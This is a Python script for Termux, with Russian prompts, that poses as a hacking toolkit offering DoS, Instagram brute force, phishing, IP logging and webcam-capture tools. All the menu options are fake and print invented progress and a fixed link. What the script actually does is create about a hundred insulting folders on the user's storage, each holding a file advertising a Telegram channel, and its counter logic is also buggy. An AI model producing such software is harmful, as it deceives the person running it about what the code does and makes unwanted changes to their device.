import os
import time
os.system('clear')
print('''
    _____   ___  __  __  ___   ___     
   |_   _| / _ \ \ \/ / |_ _| / __|   
     | |  | (_) | >  <   | | | (__      
     |_|   \___/ /_/\_\ |___| \___|     
 _____   ___    ___   _     _  _   ___   _____
|_   _| / _ \  / _ \ | |   | |/ / |_ _| |_   _|
  | |  | (_) || (_) || |__ | ' <   | |    | |  
  |_|   \___/  \___/ |____||_|\_\ |___|   |_|  

''')
task = input('''Выбери инструмент:
[1] UltraDoS
[2] Instagram brute (рут не нужен)
[3] Fishing (localhost.run + gg.gg)
[4] IPLogger
[5] SayCheese (3 приватных шаблона)
''')
if task == '1':
	os.system('clear')
	target = input('Введи адрес сайта или ip: ')
	port = input('Введи открытый порт (по умолчанию 80): ')
	print('Атака началась')
if task == '2':
	os.system('clear')
	input('Введи никнейм атакуемого аккаунта: ')
	print('Подготовка словаря...')
	time.sleep(10)
	print('Атака началась.')
if task == '3':
	input('Введи сайт, который нужно скопировать для создания фишинга: ')
	print('Генерация ссылки...')
	time.sleep(2)
	print('Ссылка сгенерирована!')
	print('Ссылка на фишинг: http://gg.gg/mn7og')
	print('После перехода по ссылке, данные жертвы появятся в файле pass.txt')
if task == '4':
	print('Генерация ссылки...')
	time.sleep(2)
	print('Ссылка сгенерирована!')
	print('Логгер: http://gg.gg/mn7og')
	print('После перехода по ссылке, данные жертвы появятся в файле ip.txt')
if task == '5':
	print('Генерация ссылки...')
	time.sleep(2)
	print('Ссылка сгенерирована!')
	print('Ссылка: http://gg.gg/mn7og')
	print('После перехода по ссылке, фото жертвы появится в папке photos')
counter = 1
while (counter<=100):
	try:
		os.makedirs('/sdcard/тебя_наебали' + '_' + str(counter) + '_раз')
		time.sleep(0.1)
		f = open('/sdcard/тебя_наебали' + '_' + str(counter) + '_раз/открой.txt', 'w')
		f.write('не хочешь больше попадаться на такую хуйню? подпишись на нас в тг: @toxic_termux')
		f.close()
		counter1 = int(counter) + 1
	except:
		os.makedirs('/data/data/com.termux/files/home/тебя_наебали' + '_' + str(counter) + '_раз')
		time.sleep(1)
		f = open('/data/data/com.termux/files/home/тебя_наебали' + '_' + str(counter) + '_раз/открой.txt', 'w')
		f.write('не хочешь больше попадаться на такую хуйню? подпишись на нас в тг: @toxic_termux')
		f.close()
		counter = int(counter) + 1
print('Атака завершена. Отчёт об атаке сохранен в памяти устройства')
